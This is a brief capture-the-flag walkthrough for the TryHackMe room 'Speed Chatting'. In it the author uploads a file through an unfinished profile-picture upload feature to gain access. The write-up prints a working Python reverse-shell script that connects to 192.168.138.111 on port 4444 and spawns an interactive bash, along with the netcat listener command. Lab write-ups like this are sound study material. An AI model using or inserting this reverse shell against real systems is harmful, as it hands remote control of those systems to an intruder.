---
title: "TryHackMe Speed Chatting Walkthrough"
date: 2026-02-17
tags:
  - tryhackme
  - ctf
  - easy
  - web
  - walkthrough
  - love at first breach
draft: false
cover:
  image: images/speed_chatting.png
  alt: This is Thumbnail
  caption: ' '
---

Room Link: [Speed Chatting](https://tryhackme.com/room/lafb2026e4)


![](Pasted%20image%2020260214023525.png)

upon visiting the website we can see there is a upload profile pic button,

given on the hint that the development of the website is not done fully yet and checking the `SSTI` in the input box we only had one option to upload a file and check what it give. 

i here used a custom python reverse shell script

```python
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.138.111",4444));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);
```

save it as `pyshell.py`

set `nc -lvnp 4444`

upload it and you got the reverse shell

![](Pasted%20image%2020260214023817.png)

You have you Flag.

